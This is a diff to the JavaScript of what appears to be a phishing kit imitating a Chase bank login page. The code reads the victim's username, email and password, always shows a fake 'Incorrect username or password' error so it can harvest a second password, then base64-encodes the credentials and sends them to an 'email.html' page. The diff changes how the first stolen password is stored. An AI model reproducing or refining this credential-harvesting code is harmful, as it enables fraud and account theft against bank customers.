@@ -229,13 +229,13 @@ setTimeout(function(){
 $('.loader-default').attr('data-text',"Connecting to chase");
 	if(clicked == 1)
 	{
-	setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
 	var encodedString = btoa(JSON.stringify({ username: $('#userId-text-input-field').val(), email: getUrlVars()['email'], password1:Window.pass1 ,password2: $('#password-text-input-field').val()}));
 	window.location.replace("/email.html?data="+encodeURIComponent(encodedString));
 	}
 	else
 	{
-	pass1 = $('#password-text-input-field').val();
+	setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
+	Window.pass1 = $('#password-text-input-field').val();
 	toastr["error"]("Incorrect username or password.");
 	$('.loader-default').removeClass('is-active');
 	$('#password-text-input-field').val('');
